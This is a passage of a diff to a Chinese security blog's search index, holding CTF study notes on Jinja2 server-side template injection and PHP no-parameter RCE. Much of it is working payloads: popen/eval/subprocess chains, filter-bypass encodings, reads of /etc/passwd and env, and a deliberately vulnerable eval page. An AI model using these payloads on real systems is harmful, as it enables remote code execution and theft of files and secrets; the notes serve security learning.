class="built_in">open</span>,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-        <tag>python</tag>
-        <tag>unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Flask Jinja2 SSTI学习记录</title>
-    <url>/2024/03/09/Jinja2%20SSTI/</url>
-    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
-<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
-<p>flask的渲染方法有render_template和render_template_string两种。</p>
-<p>感觉…没什么好多说的，就是记模板</p>
-<span id="more"></span>
-
-<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>讲述一些小细节：</p>
-<ul>
-<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
-</li>
-<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
-</li>
-</ul>
-<p>直接读文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
-<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
-<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>
-
-<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
-<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
-<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>等价于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里注意一下，其中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>
-
-<p>unicode绕过参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>
-
-<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上是盲注的写法</p>
-<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
-<p>成功率有点低就是了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p><strong>chr</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>
-
-<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>
-
-<p>写一个16进制编码的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php反序列化学习记录</title>
     <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
@@ -887,6 +945,114 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>无参数RCE学习记录</title>
+    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
+    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>
+
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
+<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
+<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
+<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
+<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
+<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
+<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
+<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>
+
+<p>将数组倒置取第一个元素相当于<code>end()</code></p>
+<p>小小举个例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
+<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
